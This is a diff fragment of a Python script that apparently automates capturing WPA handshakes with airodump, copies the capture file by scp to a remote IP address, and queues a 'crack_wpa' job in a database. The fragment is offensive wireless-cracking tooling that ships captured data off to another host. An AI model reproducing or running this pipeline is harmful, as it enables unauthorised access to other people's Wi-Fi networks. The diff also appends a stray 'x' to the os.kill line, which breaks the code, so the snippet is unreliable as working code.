@@ -30,15 +30,15 @@ def check_routine (BSSID, proc_airodump):
 	else:
 		print ("gelukt")
 		filename="/home/isis/psk/"
-		time=str(time.time())
-		filename+=time
+		timestamp=str(time.time())
+		filename+=timestamp
 		filename+=".cap"
 		os.rename("/home/isis/psk/psk-01.cap", filename)
 		command="scp "
 		command+=filename
 		command+=" isis@193.191.187.44:."
 		os.system(command)
-		os.kill(proc_airodump.pid, SIGINT)
+		os.kill(proc_airodump.pid, SIGINT)x
 
 def hand_assignment(BSSID, ESSID):
 	query= "insert into assignments (assignment, status, caption, parameter) values ('crack_wpa', 'new', 'isis-OptiPlex-755', '"
